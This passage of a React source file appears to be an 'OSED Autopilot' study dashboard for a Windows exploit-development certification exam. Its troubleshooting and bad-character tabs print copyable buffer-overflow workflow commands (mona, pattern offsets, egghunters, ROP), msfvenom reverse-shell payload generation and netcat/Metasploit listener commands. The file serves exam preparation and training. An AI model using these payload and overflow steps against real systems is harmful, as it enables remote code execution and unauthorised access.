.step{border-bottom:1px solid var(--bd)}.step:last-child{border-bottom:none}
.step-row{padding:8px 14px;display:flex;align-items:flex-start;gap:8px;cursor:pointer;transition:background .1s}
.step-row:hover{background:var(--b3)}
.snum{width:20px;height:20px;border-radius:50%;background:var(--b0);border:1px solid var(--bd);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:var(--t2);flex-shrink:0;margin-top:1px;transition:all .15s}
.snum.crit{border-color:var(--ac);color:var(--ac);background:var(--acd)}
.snum.done{border-color:var(--g);color:#fff;background:var(--g)}
.s-act{font-size:12px;font-weight:600;color:var(--t0)}.s-chk{font-size:10px;color:var(--t2);margin-top:1px}
.s-exp{background:var(--b0);margin:0 10px 10px 42px;border-radius:5px;border:1px solid var(--bd);padding:8px 10px}
.cmd{font-family:var(--m);font-size:11px;color:var(--cg);white-space:pre-wrap;word-break:break-all;line-height:1.65}
.cp{background:var(--b3);border:1px solid var(--bd);border-radius:3px;padding:2px 8px;font-size:9px;color:var(--t2);cursor:pointer;font-family:var(--m);flex-shrink:0;transition:all .15s}
.cp:hover{border-color:var(--ac);color:var(--ac)}.cp.ok{border-color:var(--g);color:var(--g)}
.arrow{font-size:9px;color:var(--t2);transition:transform .2s;flex-shrink:0}.arrow.open{transform:rotate(90deg)}
.sec-title{font-size:12px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin:16px 0 10px}
.chk-item{display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:4px;cursor:pointer;font-size:11.5px;transition:background .1s}
.chk-item:hover{background:var(--b3)}.chk-item.done{color:var(--g);opacity:.6;text-decoration:line-through}
.chk-box{width:15px;height:15px;border-radius:3px;border:1.5px solid var(--bd);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:9px;transition:all .15s}
.chk-box.on{background:var(--ac);border-color:var(--ac);color:#fff}
.prog{height:3px;background:var(--b3);border-radius:2px;margin-bottom:14px;overflow:hidden}
.prog-fill{height:100%;border-radius:2px;transition:width .3s}
.notes{width:100%;min-height:500px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;padding:14px;color:var(--t0);font-family:var(--m);font-size:11.5px;line-height:1.8;resize:vertical;outline:none}
.notes:focus{border-color:var(--ac)}
.timer-bar{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:14px;margin-bottom:14px}
.timer-display{font-family:var(--m);font-size:28px;font-weight:700;color:var(--t0);text-align:center;margin-bottom:8px}
.timer-btns{display:flex;gap:6px;justify-content:center;margin-bottom:10px}
.timer-btn{padding:5px 14px;font-size:11px;font-weight:600;border-radius:4px;border:1px solid var(--bd);background:var(--b3);color:var(--t1);cursor:pointer;font-family:var(--s);transition:all .15s}
.timer-btn:hover{border-color:var(--ac);color:var(--ac)}
.timer-btn.active{background:var(--ac);border-color:var(--ac);color:#fff}
.milestone{display:flex;gap:10px;align-items:flex-start;padding:6px 0;font-size:11px}
.mile-h{font-family:var(--m);font-weight:700;color:var(--ac);min-width:40px;flex-shrink:0}
.mile-t{color:var(--t1)}.mile-now{color:var(--g);font-weight:600}
.qref-card{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:8px 12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:all .15s;margin-bottom:4px}
.qref-card:hover{border-color:var(--ac);background:var(--b3)}
.score-bar{display:flex;gap:4px;margin-bottom:14px;flex-wrap:wrap}
.score-seg{flex:1;padding:6px 8px;border-radius:4px;font-size:10px;font-weight:600;text-align:center;cursor:default;min-width:120px}
.decision-box{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:16px;margin-bottom:14px}
.decision-box h3{color:var(--ac);font-size:14px;margin-bottom:12px}
.decision-btn{display:block;width:100%;padding:10px 14px;margin-bottom:6px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;color:var(--t0);font-family:var(--s);font-size:12px;font-weight:600;cursor:pointer;text-align:left;transition:all .15s}
.decision-btn:hover{border-color:var(--ac);background:var(--acd)}
.decision-btn.active{border-color:var(--ac);background:var(--acd);color:var(--ac)}
.stuck-card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:12px 14px;margin-bottom:8px}
.stuck-q{font-size:13px;font-weight:700;color:var(--t0);margin-bottom:4px}
.stuck-tip{font-size:11px;color:var(--t2);margin-bottom:6px}
.bc-grid{display:grid;grid-template-columns:repeat(16,1fr);gap:3px;margin-bottom:14px}
.bc-cell{aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-family:var(--m);font-size:9px;font-weight:600;border-radius:4px;cursor:pointer;transition:all .15s;border:1px solid var(--bd);background:var(--b0);color:var(--cg)}
.bc-cell:hover{border-color:var(--ac)}
.bc-cell.bad{background:rgba(239,68,68,.15);border-color:var(--r);color:var(--r);text-decoration:line-through}
.bc-out{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:10px 14px;margin-bottom:8px}
.bc-label{font-size:10px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
`;

// ━━━ COMPONENTS ━━━
function CopyBtn({text}){
  const[c,setC]=useState(false);
  return <button className={`cp ${c?'ok':''}`} onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(text);setC(true);setTimeout(()=>setC(false),1200)}}>{c?'✓':'Copy'}</button>
}

function PhaseList({phases,vals}){
  const[openP,setOpenP]=useState({0:true});
  const[openS,setOpenS]=useState({});
  const[doneS,setDoneS]=useState({});
  return(<div>{phases.map((phase,pi)=>{
    const isO=openP[pi]!==false;
    const allDone=phase.steps.every((_,si)=>doneS[`${pi}-${si}`]);
    return(<div className="phase" key={pi}>
      <div className="phase-h" onClick={()=>setOpenP(p=>({...p,[pi]:!p[pi]}))}>
        <div className={`phase-num ${allDone?'done':''}`}>{allDone?'✓':pi+1}</div>
        <div style={{flex:1}}><div className="phase-title">{phase.phase}</div><div className="phase-desc">{phase.desc}</div></div>
        <span className={`arrow ${isO?'open':''}`}>▶</span>
      </div>
      {isO&&<div className="steps-wrap">{phase.steps.map((step,si)=>{
        const k=`${pi}-${si}`;const isExp=openS[k];const isDone=doneS[k];
        const cmdText=step.cmd(vals);
        return(<div className="step" key={si}>
          <div className="step-row" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
            <div className={`snum ${isDone?'done':step.critical?'crit':''}`} onClick={e=>{e.stopPropagation();setDoneS(p=>({...p,[k]:!p[k]}))}}>{isDone?'✓':si+1}</div>
            <div style={{flex:1}}><div className="s-act">{step.action}</div><div className="s-chk">→ {step.check}</div></div>
            <CopyBtn text={cmdText}/>
          </div>
          {isExp&&<div className="s-exp"><div className="cmd">{cmdText}</div></div>}
        </div>)
      })}</div>}
    </div>)
  })}</div>)
}

// ━━━ TABS ━━━
function DecisionTab({vals}){
  const[mode,setMode]=useState(null);
  const chains={recon:RECON_CHAIN,stack:STACK_CHAIN,seh:SEH_CHAIN,egg:EGG_CHAIN,shellcode:SHELLCODE_CHAIN,rop:ROP_CHAIN,format:FORMAT_CHAIN};
  const labels={recon:"🔍 Phase 0: Recon & Reversing",stack:"💥 Phase 1: Stack Buffer Overflow",seh:"⚡ Phase 2: SEH Overflow",egg:"🥚 Phase 3: Egghunter",shellcode:"⚙️ Phase 4: Custom Shellcode",rop:"🔗 Phase 5: DEP/ASLR Bypass (ROP)",format:"📝 Phase 6: Format String Attacks"};
  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)'}}>3 Independent Tasks</div>
      <div className="score-seg" style={{background:'var(--gd)',color:'var(--g)'}}>Reverse + Exploit + Custom Shellcode</div>
      <div className="score-seg" style={{background:'rgba(234,179,8,.1)',color:'var(--y)'}}>47h45m exam + 24h report</div>
    </div>
    <div className="decision-box">
      <h3>🎯 What technique do you need?</h3>
      <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>OSED tests binary exploitation of Windows user-mode applications. Select the exploit technique.</p>
      {Object.entries(labels).map(([k,v])=>(
        <button key={k} className={`decision-btn ${mode===k?'active':''}`} onClick={()=>setMode(k)}>{v}</button>
      ))}
    </div>
    {mode&&<PhaseList phases={chains[mode]} vals={vals}/>}
  </div>)
}

function QuickRefTab(){
  const[openS,setOpenS]=useState({});
  return(<div>{Object.entries(QUICK_REF).map(([cat,cmds])=>(
    <div key={cat}><div className="sec-title">{cat}</div>
    {cmds.map((c,i)=>{const k=`${cat}-${i}`;return(<div key={i}>
      <div className="qref-card" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
        <span style={{fontSize:11,fontWeight:600,color:'var(--t0)'}}>{c.l}</span><CopyBtn text={c.c}/>
      </div>
      {openS[k]&&<div className="s-exp" style={{margin:'0 0 8px 0'}}><div className="cmd">{c.c}</div></div>}
    </div>)})}</div>
  ))}</div>)
}

function ChecklistTab(){
  const[checked,setChecked]=useState({});
  const total=Object.values(CHECKLIST).flat().length;
  const done=Object.values(checked).filter(Boolean).length;
  const pct=total>0?Math.round(done/total*100):0;
  return(<div>
    <div style={{fontSize:11,color:'var(--t2)',marginBottom:6}}>{done}/{total} completed ({pct}%)</div>
    <div className="prog"><div className="prog-fill" style={{width:`${pct}%`,background:pct>=100?'var(--g)':pct>=70?'var(--y)':'var(--ac)'}}/></div>
    {Object.entries(CHECKLIST).map(([section,items])=>(
      <div key={section}><div className="sec-title">{section}</div>
      {items.map((item,i)=>{const k=`${section}-${i}`;const on=checked[k];return(
        <div key={i} className={`chk-item ${on?'done':''}`} onClick={()=>setChecked(p=>({...p,[k]:!p[k]}))}>
          <div className={`chk-box ${on?'on':''}`}>{on?'✓':''}</div><span>{item}</span>
        </div>)})}</div>
    ))}
  </div>)
}

function TimerTab(){
  const[running,setRunning]=useState(false);
  const[elapsed,setElapsed]=useState(0);
  const ref=useRef(null);
  const start=()=>{if(!running){setRunning(true);ref.current=setInterval(()=>setElapsed(e=>e+1),1000)}};
  const pause=()=>{setRunning(false);clearInterval(ref.current)};
  const reset=()=>{setRunning(false);clearInterval(ref.current);setElapsed(0)};
  useEffect(()=>()=>clearInterval(ref.current),[]);
  const hrs=Math.floor(elapsed/3600),mins=Math.floor((elapsed%3600)/60),secs=elapsed%60;
  const display=`${String(hrs).padStart(2,'0')}:${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
  const totalSec=47*3600+45*60,remaining=Math.max(0,totalSec-elapsed);
  const rH=Math.floor(remaining/3600),rM=Math.floor((remaining%3600)/60),rS=remaining%60;
  const remD=`${String(rH).padStart(2,'0')}:${String(rM).padStart(2,'0')}:${String(rS).padStart(2,'0')}`;
  const eH=elapsed/3600;
  return(<div>
    <div className="timer-bar">
      <div style={{fontSize:10,color:'var(--t2)',textAlign:'center',marginBottom:4}}>EXAM TIME (47h 45min)</div>
      <div className="timer-display">{display}</div>
      <div style={{fontSize:12,color:remaining<=3600?'var(--r)':'var(--t2)',textAlign:'center',marginBottom:8}}>Remaining: {remD}</div>
      <div className="prog"><div className="prog-fill" style={{width:`${Math.min(100,elapsed/totalSec*100)}%`,background:remaining<=3600?'var(--r)':remaining<=14400?'var(--y)':'var(--ac)'}}/></div>
      <div className="timer-btns">
        <button className={`timer-btn ${running?'active':''}`} onClick={start}>▶ Start</button>
        <button className="timer-btn" onClick={pause}>⏸ Pause</button>
        <button className="timer-btn" onClick={reset}>↺ Reset</button>
      </div>
    </div>
    <div className="sec-title">Milestones</div>
    {MILESTONES.map((m,i)=>{
      const next=i<MILESTONES.length-1?MILESTONES[i+1]:null;
      const isCur=eH>=m.hour&&(!next||eH<next.hour);
      const passed=eH>=m.hour;
      return(<div className="milestone" key={i}>
        <div className="mile-h">{m.hour}h</div>
        <div className={`mile-t ${isCur?'mile-now':''}`} style={{opacity:passed&&!isCur?.5:1}}>{isCur?'👉 ':''}{m.label}</div>
      </div>)
    })}
  </div>)
}

function NotesTab(){
  const[notes,setNotes]=useState(()=>localStorage.getItem('osed-notes-v1')||`# OSED Exam Notes\n\n## Task 1\nBinary: \nProtections: DEP[ ] ASLR[ ] SafeSEH[ ]\nVuln Type: \nOffset: \nBad Chars: \nJMP ESP / PPR: \nproof.txt: \n\n## Task 2\nBinary: \nProtections: DEP[ ] ASLR[ ] SafeSEH[ ]\nVuln Type: \nOffset: \nBad Chars: \nproof.txt: \n\n## Task 3\nBinary: \nProtections: DEP[ ] ASLR[ ] SafeSEH[ ]\nVuln Type: \nOffset: \nBad Chars: \nproof.txt: \n\n## ROP Gadgets\n\n## Shellcode Notes\n`);
  useEffect(()=>{localStorage.setItem('osed-notes-v1',notes)},[notes]);
  return(<div>
    <p style={{fontSize:10,color:'var(--t2)',marginBottom:8}}>Notes saved to browser automatically.</p>
    <textarea className="notes" value={notes} onChange={e=>setNotes(e.target.value)} spellCheck={false}/>
  </div>)
}

// ━━━ TAB: I'M STUCK ━━━
function StuckTab(){
  const checks=[
    { q: "Did you verify the EXACT EIP/nSEH offset?", cmd: "# Generate unique pattern:\nmsf-pattern_create -l 5000\n\n# After crash, find offset:\nmsf-pattern_offset -l 5000 -q EIP_VALUE\n\n# Verify: A*offset + BBBB should give EIP=42424242\nimport struct\nbuf = b'A'*OFFSET + struct.pack('<I', 0x42424242) + b'C'*500", tip: "If EIP isn't exactly 0x42424242, your offset is wrong. Recheck with a fresh pattern.", critical: true },
    { q: "Did you find ALL bad characters?", cmd: "# Send 0x00-0xFF after EIP:\nbadchars = bytes(range(0,256))\n\n# In WinDbg: db esp L100\n# Compare byte-by-byte with expected sequence\n# Common bad: 0x00, 0x0a, 0x0d, 0x20, 0x25\n# Remove bad char and RE-TEST — one bad char can mask others!", tip: "ALWAYS re-test after removing each bad char. One bad char can truncate or corrupt subsequent bytes.", critical: true },
    { q: "Is your JMP ESP / PPR address correct?", cmd: "# JMP ESP (stack overflow):\n!mona jmp -r esp -cpb \"\\x00\\x0a\\x0d\"\n\n# POP POP RET (SEH overflow):\n!mona seh -cpb \"\\x00\\x0a\\x0d\"\n\n# CHECK:\n# 1. Module has NO ASLR + NO SafeSEH (for SEH)\n# 2. Address contains NO bad chars\n# 3. Address is correct endianness (little-endian)", tip: "Triple-check: the address bytes themselves must not contain bad characters! And the module must not have ASLR.", critical: true },
    { q: "Is DEP blocking your shellcode?", cmd: "# Check if DEP is enabled:\n!mona modules  # look for DEP column\n\n# If DEP is ON: you need ROP chain!\n# Generate ROP gadgets:\n!mona rop -m \"module.dll\" -cpb \"\\x00\"\n\n# Build VirtualProtect / VirtualAlloc chain", tip: "If your shellcode lands correctly but nothing executes, DEP is probably blocking it. You need ROP.", critical: true },
    { q: "Are you accounting for stack alignment?", cmd: "# ESP must be 16-byte aligned for some operations\n# Add alignment NOPs or SUB ESP instructions\n\n# Check ESP value after JMP ESP lands:\n# In WinDbg: ? esp & f\n# If not 0, add: sub esp, N to align", tip: "Stack misalignment can cause silent crashes. Add NOP sled (\\x90 * 16) before shellcode." },
    { q: "Is your shellcode too large for the buffer?", cmd: "# Check available space after EIP control:\n# In WinDbg: db esp L500\n# Count writable bytes\n\n# If < 400 bytes: use EGGHUNTER\n!mona egg -t w00t -cpb \"\\x00\"\n# Egghunter = ~32 bytes, searches memory for your full shellcode", tip: "If your buffer is too small, use an egghunter. Place the real shellcode in a different input/buffer.", critical: true },
    { q: "Did you try a different shellcode encoder?", cmd: "# Default (shikata_ga_nai):\nmsfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -b '\\x00' -f python\n\n# Try different encoders:\nmsfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -e x86/alpha_mixed -f python\nmsfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -e x86/fnstenv_mov -f python", tip: "If one encoder's output contains bad chars, try a different encoder. Or use custom shellcode." },
    { q: "Is your listener set up correctly?", cmd: "# Netcat:\nnc -nlvp 443\n\n# Metasploit (for staged payloads):\nmsfconsole -x 'use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST IP; set LPORT 443; run'\n\n# Check firewall isn't blocking!", tip: "Make sure listener matches payload type: staged vs stageless, architecture (x86 vs x64)." },
    { q: "Did you try the exploit multiple times?", cmd: "# Timing issues or ASLR may cause intermittent failures\n# Run exploit 3-5 times before giving up\n# Add small delays if needed:\nimport time; time.sleep(1)", tip: "Some exploits are unreliable due to timing. Try multiple times before changing approach." },
  ];
  return(<div>
    <div className="score-bar"><div className="score-seg" style={{background:'rgba(239,68,68,.08)',color:'var(--r)',flex:2}}>{`⚠️ RULE: Verify each step before moving on. Exploit dev is sequential — one wrong byte breaks everything.`}</div></div>
    <p style={{fontSize:11,color:'var(--t2)',marginBottom:14}}>Go through each question. If you answer "no" to ANY, fix it before continuing.</p>
    {checks.map((c,i)=><div className="stuck-card" key={i}>
      <div style={{display:'flex',alignItems:'flex-start',gap:10,marginBottom:6}}>
        <div className={`phase-num`} style={{width:24,height:24,fontSize:10,flexShrink:0,background:c.critical?'var(--acd)':'var(--b0)',borderColor:c.critical?'var(--ac)':'var(--bd)',color:c.critical?'var(--ac)':'var(--t2)'}}>{i+1}</div>
        <div style={{flex:1}}>
          <div className="stuck-q">{c.q}</div>
          <div className="stuck-tip">{c.tip}</div>
        </div>
        <CopyBtn text={c.cmd}/>
      </div>
      <div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4,fontSize:10,marginLeft:34}}>{c.cmd}</div>
    </div>)}
  </div>)
}

// ━━━ TAB: BAD CHARS ━━━
function BadCharsTab(){
  const[bad,setBad]=useState({0:true}); // 0x00 is almost always bad
  const toggle=(b)=>setBad(p=>({...p,[b]:!p[b]}));
  const allBytes=Array.from({length:256},(_,i)=>i);
  const goodBytes=allBytes.filter(b=>!bad[b]);
  const badBytes=allBytes.filter(b=>bad[b]);
  const pyGood=`badchars = (\n${goodBytes.reduce((acc,b,i)=>{acc+=`\\x${b.toString(16).padStart(2,'0')}`;if((i+1)%16===0&&i<goodBytes.length-1)acc+='"\n  b"';return acc},'  b"')}"\n)`;
  const pyBad=badBytes.map(b=>`\\x${b.toString(16).padStart(2,'0')}`).join('');
  const monaBad=badBytes.map(b=>`\\x${b.toString(16).padStart(2,'0')}`).join('');
  return(<div>
    <div className="sec-title">Click to toggle bad characters ({badBytes.length} bad, {goodBytes.length} clean)</div>
    <div className="bc-grid">
      {allBytes.map(b=>(
        <div key={b} className={`bc-cell ${bad[b]?'bad':''}`} onClick={()=>toggle(b)} title={`0x${b.toString(16).padStart(2,'0')} (${b})`}>
          {b.toString(16).padStart(2,'0')}
        </div>
      ))}
    </div>
    <div className="sec-title">Quick Toggle</div>
    <div style={{display:'flex',gap:6,marginBottom:14,flexWrap:'wrap'}}>
      {[{label:"+ NULL (00)",bytes:[0]},{label:"+ LF (0a)",bytes:[0x0a]},{label:"+ CR (0d)",bytes:[0x0d]},{label:"+ Space (20)",bytes:[0x20]},{label:"Reset All",bytes:[]}].map((preset,i)=>(
        <button key={i} className="timer-btn" onClick={()=>{
          if(preset.bytes.length===0){setBad({0:true});return;}
          setBad(p=>{const n={...p};preset.bytes.forEach(b=>n[b]=true);return n});
        }}>{preset.label}</button>
      ))}
    </div>
    <div className="bc-out">
      <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:4}}>
        <div className="bc-label">Python badchars (for testing) — {goodBytes.length} bytes</div>
        <CopyBtn text={pyGood}/>
      </div>
      <div className="cmd" style={{fontSize:10}}>{pyGood}</div>
    </div>
    <div className="bc-out">
      <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:4}}>
        <div className="bc-label">Bad chars string (for -b flag / mona)</div>
        <CopyBtn text={monaBad}/>
      </div>
      <div className="cmd" style={{fontSize:10}}>{`-b "${monaBad}"`}</div>
    </div>
    <div className="bc-out">
      <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:4}}>
        <div className="bc-label">msfvenom exclude</div>
        <CopyBtn text={`msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -b "${pyBad}" -f python -v shellcode`}/>
      </div>
      <div className="cmd" style={{fontSize:10}}>{`msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -b "${pyBad}" -f python -v shellcode`}</div>
    </div>
  </div>)
}

// ━━━ MAIN APP ━━━
const TABS=["🎯 Decision Engine","⚡ Quick Ref","🆘 I'm Stuck","🔢 Bad Chars","✅ Checklist","⏱ Timer","📝 Notes"];

function App(){
  const[tab,setTab]=useState(0);
  const[lhost,setLhost]=useState("");
  const[lport,setLport]=useState("");
  const[target,setTarget]=useState("");
  const[port,setPort]=useState("");
  const[binary,setBinary]=useState("");
  const[offset,setOffset]=useState("");
  const vals={lhost,lport,target,port,binary,offset};

  return(<>
    <style>{CSS}</style>
    <div className="app">
      <div className="hdr">
        <div><div className="logo">OSED Autopilot</div><div className="logo-sub">EXP-301 • Windows User Mode Exploit Dev</div></div>
        <div className="inps">
          <input className="inp" placeholder="LHOST" value={lhost} onChange={e=>setLhost(e.target.value)} style={{width:100}}/>
          <input className="inp" placeholder="LPORT" value={lport} onChange={e=>setLport(e.target.value)} style={{width:55}}/>
          <input className="inp" placeholder="Target IP" value={target} onChange={e=>setTarget(e.target.value)} style={{width:100}}/>
          <input className="inp" placeholder="Port" value={port} onChange={e=>setPort(e.target.value)} style={{width:55}}/>
          <input className="inp" placeholder="Binary name" value={binary} onChange={e=>setBinary(e.target.value)} style={{width:110}}/>
          <input className="inp" placeholder="EIP Offset" value={offset} onChange={e=>setOffset(e.target.value)} style={{width:80}}/>
        </div>
      </div>
      <div className="tabs">{TABS.map((t,i)=><button key={i} className={`tab ${tab===i?'on':''}`} onClick={()=>setTab(i)}>{t}</button>)}</div>
      <div className="main">
        {tab===0&&<DecisionTab vals={vals}/>}
        {tab===1&&<QuickRefTab/>}
        {tab===2&&<StuckTab/>}
        {tab===3&&<BadCharsTab/>}
        {tab===4&&<ChecklistTab/>}
        {tab===5&&<TimerTab/>}
        {tab===6&&<NotesTab/>}
      </div>
    </div>
  </>)
}

ReactDOM.createRoot(document.getElementById('root')).render(<App/>);
